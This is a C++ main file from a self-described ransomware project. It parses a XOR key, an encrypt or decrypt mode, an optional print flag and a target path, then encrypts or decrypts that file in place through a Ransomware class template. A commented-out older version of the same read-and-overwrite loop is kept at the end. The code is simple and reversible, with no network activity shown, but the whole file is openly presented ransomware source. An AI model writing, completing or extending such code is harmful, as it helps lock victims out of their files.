// Slavnem @2024-12-15
// Main
#ifdef MAIN

#include <iostream>
#include <string>
#include <vector>
#include <cstring>

#include <Ransomware/Ransomware.hpp>

#include <Crypt/Crypt.hpp>
#include <Crypt/Xor/Xor.hpp>

#include <FileStream/FileStream.hpp>
#include <FileStream/CFile/CFile.hpp>

// main
int main(const int argc, const char* const argv[])
{
	// get args
	if (argc < 4)
	{
		// Windows
		#if defined(_WIN32) || defined(_WIN64)
		std::cout
			<< "[ERROR] How To Run: Ransomware.exe <crypt key> <encrypt or decrypt> <print or nothing> <filepath>"
			<< "\n[INFO] Example: Ransomware.exe 36 encrypt print test/myfile.txt"
			<< std::endl;
		// Linux
		#else
		std::cout
			<< "[ERROR] How To Run: ./Ransomware.o <crypt key> <encrypt or decrypt> <print or nothing> <filepath>"
			<< "\n[INFO] Example: ./Ransomware.o 36 encrypt print test/myfile.txt"
			<< std::endl;
		#endif

		return 0;
	}

	std::vector<std::string> arguments(argv, argv + argc);
	std::string cryptKey(argv[1]);
	std::string filepath("");

	bool choiceEncrypt = false;
	bool endPrint = false;

	// encrypt key status
	if (!Crypt::Xor::validKey(cryptKey))
	{
		std::cerr << "[ERROR] Encryption Key Is Invalid!" << std::endl;
		return 0;
	}

	// encrypt or decrypt
	choiceEncrypt = (strcmp(arguments[2].c_str(), Crypt::TEXT_ENCRYPT) == 0);

	// print or not print
	if (argc > 4)
	{
		endPrint = (strcmp(arguments[3].c_str(), "print") == 0);
		filepath = arguments[4];
	}
	else
	{
		filepath = arguments[3];
	}

	// crypt obj
	Crypt::Xor::Xor cryptObject(cryptKey);

	// filestream obj
	FileStream::CFile::CFile filestreamObject(filepath, FileStream::EFILEOPEN_READWRITE);

	// ransomware object
	Ransomware::Ransomware<Crypt::Xor::Xor, FileStream::CFile::CFile> ransomwareObject
	(
		&cryptObject, &filestreamObject
	);

	// check ransomware obj
	if(ransomwareObject.isErr())
		exit(EXIT_FAILURE);

	// encrypt or decrypt
	switch (choiceEncrypt)
	{
		// encrypt
		case true:
			ransomwareObject.runEncrypt();
			break;
		// decrypt
		default:
			ransomwareObject.runDecrypt();
	}

	if (!endPrint)
		exit(EXIT_SUCCESS);

	// print
	ransomwareObject.print();

	// set file position
	/*
	FILE* myfile = fileObj.getFile();
	fseek(myfile, 0, SEEK_SET);

	// buffer and current position
	const uint16_t bufferSize = 512;
	char buffer[bufferSize];

	// file position
	long currentFilePosition = ftell(myfile);

	// encrypt or decrypt
	if (flagEncrypt & static_cast<uint8_t>(Crypt::flagEncrypt))
	{
		// encrypt
		while (fgets(buffer, bufferSize, myfile))
		{
			// convert text to string obj and encrypt the text
			std::string data(buffer);
			std::string encrypted = cryptObj.getEncrypt(data);

			// set the old file position
			fseek(myfile, currentFilePosition, SEEK_SET);

			// write data to file
			fileObj.write(encrypted);

			// get current file position
			currentFilePosition = ftell(myfile);
		}
	}
	else
	{
		// decrypt
		while (fgets(buffer, bufferSize, myfile))
		{
			// convert text to string obj and decrypt the text
			std::string data(buffer);
			std::string decrypted = cryptObj.getDecrypt(data);

			// set the old file position
			fseek(myfile, currentFilePosition, SEEK_SET);

			// write data to file
			fileObj.write(decrypted);

			// get current file position
			currentFilePosition = ftell(myfile);
		}
	}
	*/
}

#endif